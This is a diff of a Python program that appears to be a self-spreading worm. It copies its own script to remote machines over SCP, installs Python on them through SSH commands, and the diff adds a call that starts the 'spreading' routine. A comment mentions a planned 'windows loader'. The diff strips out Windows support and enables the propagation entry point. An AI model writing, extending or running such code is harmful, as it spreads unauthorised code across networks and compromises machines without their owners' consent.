@@ -27,26 +27,10 @@ class syscalls:
         python_version = None
 
         if current_os == "Windows":
-            try:
-                subprocess.run(["winget", "--version"], check=True, stdout=subprocess.DEVNULL,
-                               stderr=subprocess.DEVNULL)
-                package_manager = "winget"
-            except (subprocess.CalledProcessError, FileNotFoundError):
-                package_manager = None
-
-            try:
-                result = subprocess.run(["python", "--version"], check=True, stdout=subprocess.PIPE,
-                                        stderr=subprocess.PIPE)
-                python_installed = True
-                python_version = result.stdout.decode().strip()
-            except (subprocess.CalledProcessError, FileNotFoundError):
-                python_installed = False
-
-            return current_os, package_manager, python_installed, python_version
+            return "Windows Detected" # i may replace it with the windows loader
 
         elif current_os == "Linux":
             package_manager = None
-
             if os.path.exists('/usr/bin/apt'):
                 package_manager = 'apt'
             elif os.path.exists('/usr/bin/yum'):
@@ -162,8 +146,7 @@ class Spreader:
                             scp_client.put(script_path, remote_path)
                             os_type, package_manager, python_installed, python_version = syscalls.detect_os_and_package_manager()
                             if os_type == "Windows":
-                                if not python_installed:
-                                    ssh.exec_command("winget install Python.Python")
+                                return None
                             elif os_type == "Linux":
                                 if not python_installed:
                                     if package_manager == "apt":
@@ -208,3 +191,4 @@ if __name__ == '__main__':
     syscalls.detect_os_and_package_manager()
     ip = Spreader.get_local_ip()
     spread = Spreader(ip)
+    Spreader.spreading_mashine()
